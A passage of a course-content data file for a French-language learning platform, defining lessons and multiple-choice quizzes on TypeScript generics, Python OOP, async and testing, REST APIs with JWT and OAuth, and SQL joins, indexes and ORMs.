              "Parce qu'elles empêchent toute utilisation de `this`",
            ],
            correctIndex: 1,
            explanation:
              "Une fonction fléchée capture le `this` lexical de son scope englobant (comme une closure le fait pour les variables) — pratique pour éviter de perdre le contexte dans un callback.",
          },
        ],
      },
    ],
  },
  {
    key: "ts-generics-utility-types",
    title: "TypeScript avancé : Generics et Utility Types",
    description: "Aller au-delà des types de base : écrire du code réutilisable et type-safe avec les generics, et exploiter les utility types intégrés.",
    category: "DEVELOPMENT",
    skillKey: "typescript",
    level: 3,
    prerequisiteCourseKeys: ["typescript-for-js-devs"],
    lessons: [
      {
        order: 1,
        title: "Generics : écrire du code réutilisable et typé",
        content:
          "Un **generic** est un « type paramétré » : on écrit une fonction ou un type une seule fois, valable pour plusieurs types concrets, sans perdre la vérification de type.\n\n" +
          "```ts\nfunction premier<T>(arr: T[]): T {\n  return arr[0];\n}\npremier([1, 2, 3]);       // T = number, retourne un number\npremier(['a', 'b']);      // T = string, retourne un string\n```\n\n" +
          "Sans generics, on utiliserait `any` (perte totale du typage : `premier([1,2,3])` pourrait retourner n'importe quoi sans avertissement du compilateur) ou on dupliquerait la fonction pour chaque type. Le generic `T` garde la relation entre le type d'entrée et le type de sortie, vérifiée par le compilateur.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Que perd-on en utilisant `any` à la place d'un generic `<T>` ?",
            choices: [
              "Rien, c'est strictement équivalent",
              "La vérification de type : le compilateur n'avertit plus des erreurs de type liées à cette valeur",
              "La possibilité d'utiliser des tableaux",
              "La compatibilité avec JavaScript",
            ],
            correctIndex: 1,
            explanation:
              "`any` désactive la vérification de type pour cette valeur — le generic garde au contraire la relation exacte entre le type d'entrée et de sortie, vérifiée à la compilation.",
          },
          {
            order: 2,
            prompt: "Dans `function premier<T>(arr: T[]): T`, que représente `T` ?",
            choices: [
              "Un type fixe, toujours `number`",
              "Un paramètre de type, déterminé selon l'argument réellement passé à chaque appel",
              "Une abréviation de `true`",
              "Un mot-clé sans signification particulière",
            ],
            correctIndex: 1,
            explanation:
              "`T` est un paramètre de type : le compilateur l'infère à partir de l'argument fourni à chaque appel (`number[]` → `T = number`, `string[]` → `T = string`).",
          },
        ],
      },
      {
        order: 2,
        title: "Utility Types les plus utiles",
        content:
          "TypeScript fournit des **utility types** intégrés pour transformer des types existants sans les réécrire à la main :\n\n" +
          "- `Partial<T>` : rend toutes les propriétés de `T` optionnelles (utile pour un objet de mise à jour partielle).\n" +
          "- `Required<T>` : rend toutes les propriétés obligatoires (inverse de `Partial`).\n" +
          "- `Pick<T, 'a' | 'b'>` : ne garde que certaines propriétés de `T`.\n" +
          "- `Omit<T, 'a'>` : garde toutes les propriétés de `T` sauf celles listées.\n" +
          "- `Readonly<T>` : rend toutes les propriétés en lecture seule.\n\n" +
          "```ts\ninterface User { id: number; nom: string; email: string; }\nfunction updateUser(id: number, changes: Partial<User>) { /* ... */ }\nupdateUser(1, { nom: 'Alice' }); // valide, pas besoin de fournir email\n```",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Que fait `Partial<User>` ?",
            choices: [
              "Supprime la moitié des propriétés de `User`",
              "Rend toutes les propriétés de `User` optionnelles",
              "Rend toutes les propriétés de `User` en lecture seule",
              "Crée un tableau de `User`",
            ],
            correctIndex: 1,
            explanation:
              "`Partial<T>` transforme chaque propriété de `T` en propriété optionnelle — très utile pour typer un objet représentant une mise à jour partielle.",
          },
          {
            order: 2,
            prompt: "Quelle est la différence entre `Pick<T, 'a'>` et `Omit<T, 'a'>` ?",
            choices: [
              "Elles sont strictement identiques",
              "`Pick` ne garde que la propriété listée, `Omit` garde tout sauf la propriété listée",
              "`Pick` supprime des propriétés, `Omit` en ajoute",
              "`Omit` ne fonctionne que sur des tableaux",
            ],
            correctIndex: 1,
            explanation:
              "`Pick<T, K>` construit un type avec uniquement les clés `K` de `T` ; `Omit<T, K>` fait l'inverse — garde tout `T` sauf les clés `K`.",
          },
        ],
      },
      {
        order: 3,
        title: "Narrowing : affiner un type au fil du code",
        content:
          "Le **narrowing** (rétrécissement) est le processus par lequel TypeScript affine le type d'une variable au sein d'un bloc conditionnel, à partir de vérifications runtime classiques.\n\n" +
          "```ts\nfunction traiter(valeur: string | number) {\n  if (typeof valeur === 'string') {\n    valeur.toUpperCase(); // TS sait ici que valeur est string\n  } else {\n    valeur.toFixed(2); // TS sait ici que valeur est number\n  }\n}\n```\n\n" +
          "Sur des objets, `in` (`'email' in user`) ou une propriété discriminante commune (`type: 'circle' | 'square'`) permettent le même affinage. C'est ce mécanisme qui rend les **union types** (`string | number`) réellement pratiques à l'usage : pas besoin de cast manuel, TypeScript comprend les vérifications runtime standard.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Que fait TypeScript après un `if (typeof valeur === 'string')` sur une variable de type `string | number` ?",
            choices: [
              "Rien, il faut caster manuellement le type",
              "Il affine (narrow) le type de la variable en `string` à l'intérieur de ce bloc",
              "Il lève une erreur de compilation",
              "Il transforme la variable en `any`",
            ],
            correctIndex: 1,
            explanation:
              "C'est le narrowing : TypeScript comprend les vérifications runtime classiques (`typeof`, `in`, propriété discriminante) et affine le type en conséquence dans chaque branche.",
          },
          {
            order: 2,
            prompt: "Pourquoi le narrowing rend-il les union types (`string | number`) pratiques à utiliser ?",
            choices: [
              "Il élimine le besoin d'union types",
              "Il permet d'utiliser en sécurité les méthodes propres à chaque type après une vérification runtime, sans cast manuel",
              "Il convertit automatiquement toutes les valeurs en string",
              "Il n'a aucun rapport avec les union types",
            ],
            correctIndex: 1,
            explanation:
              "Sans narrowing, il faudrait caster manuellement (`as string`) à chaque usage, perdant en partie la sécurité du typage — le narrowing garde la vérification automatique du compilateur.",
          },
        ],
      },
    ],
  },
  {
    key: "python-oop-modules",
    title: "Python : POO, Modules et Environnements virtuels",
    description: "Structurer du code Python avec des classes, l'organiser en modules, et isoler ses dépendances proprement.",
    category: "DEVELOPMENT",
    skillKey: "python",
    level: 2,
    prerequisiteCourseKeys: ["python-intro"],
    lessons: [
      {
        order: 1,
        title: "Classes et objets en Python",
        content:
          "Python est orienté objet nativement. Une classe se définit avec `class`, et `__init__` est le constructeur — appelé automatiquement à la création d'une instance.\n\n" +
          "```python\nclass Utilisateur:\n    def __init__(self, nom, email):\n        self.nom = nom\n        self.email = email\n\n    def saluer(self):\n        return f\"Bonjour {self.nom}\"\n\nu = Utilisateur(\"Alice\", \"alice@example.com\")\nprint(u.saluer())  # Bonjour Alice\n```\n\n" +
          "`self` (premier paramètre de toute méthode d'instance) représente l'instance elle-même — Python ne le passe pas implicitement comme `this` en JS/Java, il faut le déclarer explicitement dans chaque méthode.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Quand la méthode `__init__` d'une classe Python est-elle appelée ?",
            choices: [
              "Jamais automatiquement, il faut l'appeler manuellement",
              "Automatiquement à chaque création d'une nouvelle instance de la classe",
              "Uniquement quand on appelle `print()` sur l'objet",
              "Une seule fois pour toute la classe, peu importe le nombre d'instances",
            ],
            correctIndex: 1,
            explanation:
              "`__init__` est le constructeur : Python l'appelle automatiquement à chaque fois qu'une nouvelle instance est créée (`Utilisateur(\"Alice\", ...)`), pour initialiser ses attributs.",
          },
          {
            order: 2,
            prompt: "Pourquoi `self` doit-il être déclaré explicitement comme premier paramètre de chaque méthode en Python ?",
            choices: [
              "C'est optionnel, Python l'ajoute automatiquement si absent",
              "Python ne passe pas implicitement la référence à l'instance comme le ferait `this` en JS — il faut la déclarer",
              "`self` est un mot-clé réservé sans rapport avec l'instance",
              "C'est une convention purement esthétique sans effet réel",
            ],
            correctIndex: 1,
            explanation:
              "Contrairement à `this` en JavaScript (implicite), Python exige que `self` soit explicitement le premier paramètre de toute méthode d'instance pour recevoir la référence à l'objet.",
          },
        ],
      },
      {
        order: 2,
        title: "Organiser du code en modules",
        content:
          "Un **module** Python est simplement un fichier `.py` — ses fonctions/classes deviennent importables ailleurs avec `import`.\n\n" +
          "```python\n# utils.py\ndef addition(a, b):\n    return a + b\n\n# main.py\nfrom utils import addition\nprint(addition(2, 3))  # 5\n```\n\n" +
          "Un **package** est un dossier contenant plusieurs modules, avec un fichier `__init__.py` qui marque le dossier comme importable en tant qu'unité. Le bloc `if __name__ == \"__main__\":` permet à un fichier de se comporter différemment selon qu'il est exécuté directement (`python main.py`) ou importé comme module ailleurs — le code sous ce bloc ne s'exécute que dans le premier cas.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Qu'est-ce qui distingue un « module » d'un « package » en Python ?",
            choices: [
              "Aucune différence, ce sont des synonymes",
              "Un module est un fichier `.py` unique, un package est un dossier contenant plusieurs modules",
              "Un package ne peut contenir aucune fonction",
              "Un module ne peut être utilisé qu'une seule fois",
            ],
            correctIndex: 1,
            explanation:
              "Un module = un fichier `.py` importable. Un package = un dossier regroupant plusieurs modules, identifié comme tel via `__init__.py`.",
          },
          {
            order: 2,
            prompt: "À quoi sert `if __name__ == \"__main__\":` ?",
            choices: [
              "À déclarer la fonction principale obligatoire de tout script Python",
              "À exécuter du code uniquement quand le fichier est lancé directement, pas quand il est importé ailleurs",
              "À importer automatiquement tous les modules du projet",
              "À définir le nom du fichier courant",
            ],
            correctIndex: 1,
            explanation:
              "Ce bloc ne s'exécute que si le script est lancé directement (`python fichier.py`) — s'il est importé (`import fichier`) depuis un autre script, ce code est ignoré.",
          },
        ],
      },
      {
        order: 3,
        title: "Environnements virtuels : isoler ses dépendances",
        content:
          "Un **environnement virtuel** (venv) crée une installation Python isolée par projet, avec ses propres dépendances — sans ça, tous les projets partageraient les mêmes paquets installés globalement, avec des risques de conflits de versions entre projets.\n\n" +
          "```bash\npython -m venv .venv        # crée l'environnement\nsource .venv/bin/activate   # l'active (Linux/macOS)\npip install requests        # installe DANS ce venv, pas globalement\npip freeze > requirements.txt  # fige les versions installées\n```\n\n" +
          "`requirements.txt` liste les dépendances exactes du projet — un autre développeur (ou un serveur de déploiement) peut recréer le même environnement avec `pip install -r requirements.txt`, garantissant que tout le monde utilise les mêmes versions de paquets.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Pourquoi utiliser un environnement virtuel plutôt qu'installer les paquets globalement ?",
            choices: [
              "Ça rend Python plus rapide à l'exécution",
              "Ça isole les dépendances par projet, évitant les conflits de versions entre projets différents",
              "C'est obligatoire pour que `import` fonctionne",
              "Ça remplace complètement le besoin de `pip`",
            ],
            correctIndex: 1,
            explanation:
              "Sans isolation, deux projets nécessitant des versions différentes d'une même bibliothèque entreraient en conflit sur une installation globale partagée — le venv évite ce problème.",
          },
          {
            order: 2,
            prompt: "À quoi sert le fichier `requirements.txt` ?",
            choices: [
              "À documenter les fonctionnalités du projet",
              "À lister les dépendances et leurs versions exactes, pour recréer le même environnement ailleurs",
              "À remplacer le code source du projet",
              "C'est un fichier généré automatiquement sans utilité pratique",
            ],
            correctIndex: 1,
            explanation:
              "`pip freeze > requirements.txt` fige les versions exactes installées — `pip install -r requirements.txt` permet ensuite à quiconque de recréer un environnement identique.",
          },
        ],
      },
    ],
  },
  {
    key: "python-async-testing",
    title: "Python avancé : Async, Typing et Testing",
    description: "Écrire du Python asynchrone, typé et testé — les pratiques qui distinguent un script jetable d'un vrai projet maintenable.",
    category: "DEVELOPMENT",
    skillKey: "python",
    level: 3,
    prerequisiteCourseKeys: ["python-oop-modules"],
    lessons: [
      {
        order: 1,
        title: "async/await en Python",
        content:
          "Python gère l'asynchrone avec `async`/`await`, via le module `asyncio` — le principe est similaire à JavaScript : une fonction `async def` retourne une **coroutine**, exécutée uniquement quand on l'`await` ou qu'on la lance dans une boucle d'événements.\n\n" +
          "```python\nimport asyncio\n\nasync def recuperer_donnees():\n    await asyncio.sleep(1)  # simule un appel réseau\n    return \"données\"\n\nasync def main():\n    resultat = await recuperer_donnees()\n    print(resultat)\n\nasyncio.run(main())\n```\n\n" +
          "Contrairement à JavaScript où l'asynchrone est natif au moteur, Python reste synchrone par défaut : mélanger du code bloquant (ex: `time.sleep()`) dans une fonction `async` bloque quand même toute la boucle d'événements — il faut utiliser les équivalents async (`asyncio.sleep()`) ou déléguer à un thread.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Que retourne une fonction Python déclarée `async def` quand on l'appelle sans `await` ?",
            choices: [
              "Le résultat directement, comme une fonction normale",
              "Une coroutine, qui ne s'exécute que si on l'`await` ou qu'on la lance dans une boucle d'événements",
              "Toujours `None`",
              "Une erreur de syntaxe",
            ],
            correctIndex: 1,
            explanation:
              "Appeler une fonction `async def` crée un objet coroutine sans l'exécuter — il faut soit `await` cette coroutine, soit la passer à `asyncio.run()` pour réellement l'exécuter.",
          },
          {
            order: 2,
            prompt: "Pourquoi utiliser `time.sleep()` (bloquant) dans une fonction `async` pose problème ?",
            choices: [
              "Ça n'a aucun effet négatif en Python",
              "Ça bloque toute la boucle d'événements, empêchant les autres coroutines de s'exécuter pendant ce temps",
              "Ça lève systématiquement une exception",
              "Ça ralentit uniquement la fonction courante, pas les autres",
            ],
            correctIndex: 1,
            explanation:
              "`time.sleep()` bloque le thread entier, y compris la boucle d'événements asyncio — il faut utiliser `asyncio.sleep()` (non-bloquant) pour ne pas geler les autres tâches asynchrones en cours.",
          },
        ],
      },
      {
        order: 2,
        title: "Type hints : typer sans changer le runtime",
        content:
          "Depuis Python 3.5+, on peut annoter les types avec les **type hints** — purement indicatifs au runtime (Python reste dynamiquement typé), mais exploités par des outils comme `mypy` pour détecter des erreurs de type avant l'exécution.\n\n" +
          "```python\ndef addition(a: int, b: int) -> int:\n    return a + b\n\nfrom typing import Optional, List\n\ndef trouver_user(id: int) -> Optional[dict]:\n    # peut retourner un dict ou None\n    ...\n\ndef lister_noms(users: List[dict]) -> List[str]:\n    return [u[\"nom\"] for u in users]\n```\n\n" +
          "Les type hints ne sont **jamais vérifiés à l'exécution** par défaut : `addition(\"a\", \"b\")` s'exécute sans erreur immédiate malgré l'annotation `int` — c'est un outil séparé (`mypy`, `pyright`) qui analyse le code statiquement pour signaler ce genre d'incohérence, exactement comme le compilateur TypeScript le fait pour JS.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Que se passe-t-il si on appelle `addition(\"a\", \"b\")` sur une fonction annotée `def addition(a: int, b: int) -> int`, sans utiliser `mypy` ?",
            choices: [
              "Python lève immédiatement une TypeError avant d'exécuter la fonction",
              "La fonction s'exécute quand même, les type hints n'étant pas vérifiés au runtime par défaut",
              "Le fichier ne compile pas",
              "Python convertit automatiquement les strings en int",
            ],
            correctIndex: 1,
            explanation:
              "Les type hints sont purement indicatifs pour Python au runtime — sans outil externe comme `mypy`, aucune vérification de type n'a lieu à l'exécution, même en cas d'incohérence flagrante.",
          },
          {
            order: 2,
            prompt: "Que signifie `Optional[dict]` comme type de retour ?",
            choices: [
              "La fonction retourne toujours un dict, jamais rien d'autre",
              "La fonction peut retourner soit un dict, soit None",
              "La fonction accepte un dict optionnel en paramètre",
              "Le type dict est facultatif à typer",
            ],
            correctIndex: 1,
            explanation:
              "`Optional[X]` est un raccourci pour `Union[X, None]` — ça signale explicitement que la fonction peut retourner `None`, un cas que l'appelant doit gérer.",
          },
        ],
      },
      {
        order: 3,
        title: "Tester son code avec pytest",
        content:
          "`pytest` est le framework de test le plus utilisé en Python — un test est simplement une fonction dont le nom commence par `test_`, qui utilise `assert` pour vérifier un résultat attendu.\n\n" +
          "```python\n# calc.py\ndef addition(a, b):\n    return a + b\n\n# test_calc.py\nfrom calc import addition\n\ndef test_addition_positifs():\n    assert addition(2, 3) == 5\n\ndef test_addition_negatifs():\n    assert addition(-1, -1) == -2\n```\n\n" +
          "`pytest` découvre automatiquement tous les fichiers `test_*.py` et exécute chaque fonction `test_*` — un `assert` qui échoue fait échouer le test correspondant, sans arrêter les autres. Les **fixtures** (`@pytest.fixture`) permettent de préparer un état commun réutilisable (ex: une connexion DB de test) entre plusieurs tests, sans dupliquer le code de setup.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Comment pytest identifie-t-il automatiquement quelles fonctions sont des tests ?",
            choices: [
              "Il faut les enregistrer manuellement dans un fichier de configuration",
              "Toute fonction dont le nom commence par `test_` dans un fichier `test_*.py`",
              "Toute fonction qui contient le mot `assert`",
              "Uniquement les fonctions décorées avec `@test`",
            ],
            correctIndex: 1,
            explanation:
              "pytest découvre automatiquement les fichiers `test_*.py` et y exécute chaque fonction dont le nom commence par `test_`, sans configuration manuelle nécessaire pour ce cas simple.",
          },
          {
            order: 2,
            prompt: "Quand un `assert` échoue dans un test pytest, que se passe-t-il pour les AUTRES tests du même fichier ?",
            choices: [
              "Tous les autres tests sont annulés automatiquement",
              "Ils s'exécutent quand même normalement — seul le test contenant l'assertion échouée est marqué en échec",
              "Le fichier entier refuse de s'exécuter",
              "pytest corrige automatiquement l'erreur",
            ],
            correctIndex: 1,
            explanation:
              "Chaque fonction `test_*` est indépendante — l'échec d'un `assert` dans l'une n'empêche pas les autres tests du même fichier (ou d'autres fichiers) de s'exécuter et d'être rapportés séparément.",
          },
        ],
      },
    ],
  },
  {
    key: "backend-rest-auth",
    title: "Backend : API REST et Authentification",
    description: "Concevoir une API REST propre et sécuriser l'accès avec JWT et OAuth — les bases indispensables de tout backend moderne.",
    category: "DEVELOPMENT",
    skillKey: "apis",
    level: 3,
    prerequisiteCourseKeys: ["js-intro"],
    lessons: [
      {
        order: 1,
        title: "Concevoir une API REST propre",
        content:
          "REST (**RE**presentational **S**tate **T**ransfer) est un style d'architecture, pas un protocole strict — quelques conventions en font une bonne API REST :\n\n" +
          "- Les URLs représentent des **ressources** (noms, au pluriel) : `/users`, `/users/42`, pas des actions (`/getUser?id=42`).\n" +
          "- Les méthodes HTTP portent l'action : `GET` (lire), `POST` (créer), `PUT`/`PATCH` (modifier), `DELETE` (supprimer) — pas besoin de le répéter dans l'URL.\n" +
          "- Les codes de statut HTTP communiquent le résultat : `200` OK, `201` Créé, `400` requête invalide, `401` non authentifié, `403` non autorisé, `404` introuvable, `500` erreur serveur.\n" +
          "- **Stateless** : chaque requête contient toute l'information nécessaire (ex: le token d'auth) — le serveur ne garde pas de session en mémoire entre les requêtes.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Dans une API REST bien conçue, comment doit-on représenter l'action de créer un utilisateur ?",
            choices: [
              "`GET /createUser`", "`POST /users`", "`GET /users/create`", "`DELETE /users/new`",
            ],
            correctIndex: 1,
            explanation:
              "L'URL représente la ressource (`/users`), et la méthode HTTP `POST` porte l'action de création — pas besoin de verbe dans l'URL comme `/createUser`.",
          },
          {
            order: 2,
            prompt: "Que signifie « stateless » pour une API REST ?",
            choices: [
              "L'API ne peut jamais changer d'état",
              "Chaque requête contient toute l'information nécessaire — le serveur ne garde pas de session en mémoire entre les requêtes",
              "L'API n'a pas de base de données",
              "L'API ne peut traiter qu'une requête à la fois",
            ],
            correctIndex: 1,
            explanation:
              "Le principe stateless signifie que le serveur ne dépend d'aucun état conservé entre deux requêtes — chaque requête doit s'authentifier et se contextualiser elle-même (ex: via un token).",
          },
        ],
      },
      {
        order: 2,
        title: "Authentification avec JWT",
        content:
          "Un **JWT** (JSON Web Token) est un token auto-porteur : il contient lui-même les informations d'identité (payload), signées cryptographiquement — le serveur peut vérifier son authenticité sans avoir besoin de stocker de session.\n\n" +
          "Structure : `header.payload.signature` (3 parties encodées en Base64, séparées par des points). Le flux typique :\n\n" +
          "1. L'utilisateur se connecte (login + mot de passe) → le serveur vérifie et génère un JWT signé.\n" +
          "2. Le client stocke ce token et l'envoie dans l'en-tête `Authorization: Bearer <token>` de chaque requête suivante.\n" +
          "3. Le serveur vérifie la signature du token (sans base de données !) pour confirmer qu'il n'a pas été modifié, et lit le payload pour identifier l'utilisateur.\n\n" +
          "Un JWT a une **expiration** (`exp` dans le payload) — un token expiré doit être rejeté, forçant une reconnexion ou un rafraîchissement via un refresh token dédié.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Pourquoi un serveur n'a-t-il pas besoin de base de données pour vérifier un JWT ?",
            choices: [
              "Parce que les JWT ne peuvent jamais être falsifiés de toute façon",
              "Parce que la signature cryptographique du token permet de vérifier son authenticité directement, sans consulter un stockage externe",
              "Parce que les JWT n'expirent jamais",
              "Ce n'est pas vrai, une base de données est toujours nécessaire",
            ],
            correctIndex: 1,
            explanation:
              "Le JWT est auto-porteur et signé : vérifier la signature (avec la clé secrète du serveur) suffit à confirmer que le contenu n'a pas été altéré, sans avoir besoin de retrouver une session stockée ailleurs.",
          },
          {
            order: 2,
            prompt: "Où le client doit-il envoyer le JWT pour s'authentifier sur les requêtes suivantes ?",
            choices: [
              "Dans le corps (body) de chaque requête GET",
              "Dans l'en-tête `Authorization: Bearer <token>`",
              "Dans l'URL en paramètre visible",
              "Il n'a besoin de l'envoyer qu'une seule fois, jamais après",
            ],
            correctIndex: 1,
            explanation:
              "La convention standard est l'en-tête `Authorization: Bearer <token>` — le mettre dans l'URL l'exposerait dans les logs serveur et l'historique du navigateur, un risque de sécurité inutile.",
          },
        ],
      },
      {
        order: 3,
        title: "OAuth 2.0 : déléguer l'authentification",
        content:
          "**OAuth 2.0** résout un problème différent du login classique : permettre à une application (« client ») d'accéder à des ressources d'un utilisateur sur un service tiers (« Google », « GitHub »), **sans jamais voir son mot de passe**.\n\n" +
          "Flux simplifié (Authorization Code) :\n\n" +
          "1. L'utilisateur clique « Se connecter avec GitHub » sur l'app.\n" +
          "2. Il est redirigé vers GitHub, où il autorise explicitement l'accès demandé (scopes).\n" +
          "3. GitHub redirige vers l'app avec un **code d'autorisation** temporaire.\n" +
          "4. L'app échange ce code contre un **access token** en coulisses (requête serveur-à-serveur, avec un secret client).\n" +
          "5. L'app utilise cet access token pour appeler l'API GitHub au nom de l'utilisateur, dans la limite des scopes autorisés.\n\n" +
          "OAuth gère l'**autorisation** (« qu'est-ce que l'app a le droit de faire »), pas directement l'**authentification** de l'utilisateur — OpenID Connect (OIDC) est une couche construite par-dessus OAuth spécifiquement pour ce second besoin.",
        xpReward: 30,
        questions: [
          {
            order: 1,
            prompt: "Quel est l'avantage principal d'OAuth pour l'utilisateur qui se connecte via « Se connecter avec GitHub » ?",
            choices: [
              "L'application obtient directement son mot de passe GitHub pour plus de simplicité",
              "L'application n'a jamais accès à son mot de passe — seulement à un access token limité aux scopes autorisés",
              "OAuth ne présente aucun avantage réel",
              "L'utilisateur doit créer un nouveau mot de passe spécifique à l'application",
            ],
            correctIndex: 1,
            explanation:
              "Le principe même d'OAuth est d'éviter que l'application tierce voie le mot de passe de l'utilisateur — elle reçoit un access token, révocable et limité aux permissions (scopes) accordées.",
          },
          {
            order: 2,
            prompt: "Que gère principalement OAuth 2.0, par opposition à OpenID Connect (OIDC) ?",
            choices: [
              "L'authentification de l'utilisateur (« qui est cette personne »)",
              "L'autorisation (« qu'est-ce que l'application a le droit de faire au nom de l'utilisateur »)",
              "Le chiffrement des mots de passe en base de données",
              "La création automatique de comptes utilisateurs",
            ],
            correctIndex: 1,
            explanation:
              "OAuth 2.0 est né pour l'autorisation d'accès délégué — OpenID Connect (OIDC) ajoute une couche d'identité par-dessus spécifiquement pour répondre au besoin d'authentification.",
          },
        ],
      },
    ],
  },
  {
    key: "databases-sql-orm",
    title: "Bases de données : SQL avancé et ORM",
    description: "Aller plus loin que les requêtes SQL de base, comprendre les index et le rôle d'un ORM.",
    category: "DEVELOPMENT",
    skillKey: "sql",
    level: 2,
    prerequisiteCourseKeys: ["js-intro"],
    lessons: [
      {
        order: 1,
        title: "Jointures et agrégations",
        content:
          "Une **jointure** (`JOIN`) combine des lignes de plusieurs tables selon une condition commune, généralement une clé étrangère.\n\n" +
          "```sql\nSELECT users.nom, orders.montant\nFROM users\nINNER JOIN orders ON orders.user_id = users.id;\n```\n\n" +
          "`INNER JOIN` ne garde que les lignes qui matchent des deux côtés ; `LEFT JOIN` garde toutes les lignes de la table de gauche même sans correspondance à droite (valeurs `NULL` pour les colonnes manquantes). Les fonctions d'agrégation (`COUNT`, `SUM`, `AVG`, `MAX`, `MIN`) combinées à `GROUP BY` résument des groupes de lignes : `SELECT user_id, COUNT(*) FROM orders GROUP BY user_id;` compte les commandes par utilisateur. `HAVING` filtre après agrégation (contrairement à `WHERE`, qui filtre avant).",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Quelle est la différence entre `INNER JOIN` et `LEFT JOIN` ?",
            choices: [
              "Aucune différence, ce sont des synonymes",
              "`INNER JOIN` ne garde que les lignes qui matchent des deux côtés ; `LEFT JOIN` garde aussi les lignes de gauche sans correspondance",
              "`LEFT JOIN` ne fonctionne que sur des tables sans clé étrangère",
              "`INNER JOIN` est toujours plus lent que `LEFT JOIN`",
            ],
            correctIndex: 1,
            explanation:
              "`INNER JOIN` exclut les lignes sans correspondance dans l'autre table ; `LEFT JOIN` conserve toutes les lignes de la table de gauche, avec `NULL` pour les colonnes de droite quand il n'y a pas de correspondance.",
          },
          {
            order: 2,
            prompt: "Pourquoi utilise-t-on `HAVING` plutôt que `WHERE` pour filtrer sur le résultat de `COUNT(*)` ?",
            choices: [
              "`WHERE` et `HAVING` sont interchangeables dans tous les cas",
              "`WHERE` filtre les lignes avant l'agrégation, `HAVING` filtre les groupes après agrégation — seul `HAVING` peut utiliser le résultat d'une fonction comme `COUNT(*)`",
              "`HAVING` est plus rapide que `WHERE` dans tous les cas",
              "`WHERE` ne fonctionne qu'avec `GROUP BY`",
            ],
            correctIndex: 1,
            explanation:
              "`WHERE` s'applique avant que les lignes soient regroupées et agrégées — au moment où `WHERE` s'exécute, `COUNT(*)` n'existe pas encore. `HAVING` s'applique après, sur les groupes déjà formés.",
          },
        ],
      },
      {
        order: 2,
        title: "Index : accélérer les requêtes",
        content:
          "Un **index** est une structure de données annexe (souvent un arbre B) qui permet à la base de données de retrouver des lignes sans parcourir toute la table (**full table scan**) — comme l'index d'un livre évite de tout lire pour trouver un mot.\n\n" +
          "```sql\nCREATE INDEX idx_users_email ON users(email);\n```\n\n" +
          "Un index accélère les `WHERE`/`JOIN`/`ORDER BY` sur la colonne indexée, mais a un coût : il ralentit légèrement les `INSERT`/`UPDATE`/`DELETE` (l'index doit être maintenu à jour), et occupe de l'espace disque supplémentaire. Les colonnes fréquemment filtrées ou jointes (clés étrangères, emails, slugs uniques) sont de bonnes candidates — indexer une colonne rarement filtrée, ou une table très petite, apporte peu de bénéfice pour un coût réel.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Quel est le principal bénéfice d'un index sur une colonne ?",
            choices: [
              "Il empêche toute donnée dupliquée dans la table",
              "Il évite un parcours complet de la table (full table scan) pour les requêtes qui filtrent/joignent sur cette colonne",
              "Il chiffre automatiquement les données de la colonne",
              "Il réduit la taille de la base de données",
            ],
            correctIndex: 1,
            explanation:
              "Un index permet à la base de retrouver directement les lignes concernées via une structure optimisée (arbre B typiquement), au lieu de parcourir chaque ligne de la table une par une.",
          },
          {
            order: 2,
            prompt: "Quel est le coût réel d'ajouter un index sur une colonne ?",
            choices: [
              "Aucun coût, un index n'a que des avantages",
              "Il ralentit légèrement les écritures (INSERT/UPDATE/DELETE) et consomme de l'espace disque supplémentaire",
              "Il rend les lectures plus lentes",
              "Il empêche d'utiliser `JOIN` sur cette table",
            ],
            correctIndex: 1,
            explanation:
              "Chaque écriture doit aussi mettre à jour la structure de l'index en plus de la table elle-même — indexer sans discernement toutes les colonnes peut donc ralentir les écritures inutilement.",
          },
        ],
      },
      {
        order: 3,
        title: "Le rôle d'un ORM",
        content:
          "Un **ORM** (Object-Relational Mapper, ex: Prisma, Sequelize, SQLAlchemy) fait le pont entre des objets/classes du langage applicatif et des lignes de tables SQL — on manipule des objets, l'ORM génère le SQL correspondant.\n\n" +
          "```ts\n// Avec un ORM (Prisma)\nconst user = await prisma.user.findUnique({ where: { id: 1 } });\n\n// SQL équivalent généré\n// SELECT * FROM users WHERE id = 1 LIMIT 1;\n```\n\n" +
          "Avantages : moins de SQL à écrire à la main, protection native contre l'injection SQL (requêtes paramétrées automatiquement), migrations de schéma versionnées, autocomplétion typée. Limite à connaître : un ORM peut générer du SQL sous-optimal pour des requêtes complexes (agrégations lourdes, jointures multiples) — savoir lire le SQL généré (ou écrire une requête brute pour ces cas précis) reste une compétence utile, pas remplaçable entièrement par l'ORM.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Quel est le rôle principal d'un ORM ?",
            choices: [
              "Remplacer complètement le besoin d'une base de données",
              "Faire le pont entre des objets du code applicatif et des lignes de tables SQL, en générant le SQL correspondant",
              "Accélérer physiquement le disque dur",
              "Chiffrer automatiquement toute la base de données",
            ],
            correctIndex: 1,
            explanation:
              "Un ORM traduit des opérations sur des objets/classes du langage applicatif en requêtes SQL équivalentes, évitant d'écrire le SQL à la main pour les cas courants.",
          },
          {
            order: 2,
            prompt: "Pourquoi ne peut-on pas toujours se reposer aveuglément sur l'ORM pour toutes les requêtes ?",
            choices: [
              "Les ORM ne fonctionnent jamais correctement",
              "Sur des requêtes complexes (agrégations lourdes, jointures multiples), l'ORM peut générer du SQL sous-optimal — savoir lire/écrire du SQL reste utile",
              "Les ORM ne permettent jamais d'écrire de requête brute",
              "Utiliser un ORM est toujours plus lent que le SQL brut, sans exception",
            ],
            correctIndex: 1,
            explanation:
              "Un ORM optimise pour le cas général, pas pour chaque requête spécifique — comprendre le SQL généré (et pouvoir écrire une requête brute quand nécessaire) reste une compétence complémentaire utile.",
          },
        ],
      },
    ],
  },
  {
    key: "git-advanced-workflow",
    title: "Git avancé : branches, rebase et workflows",
    description: "Aller au-delà de `git add/commit/push` : gérer des branches proprement, comprendre rebase vs merge, résoudre des conflits.",
    category: "DEVELOPMENT",
    skillKey: "git",
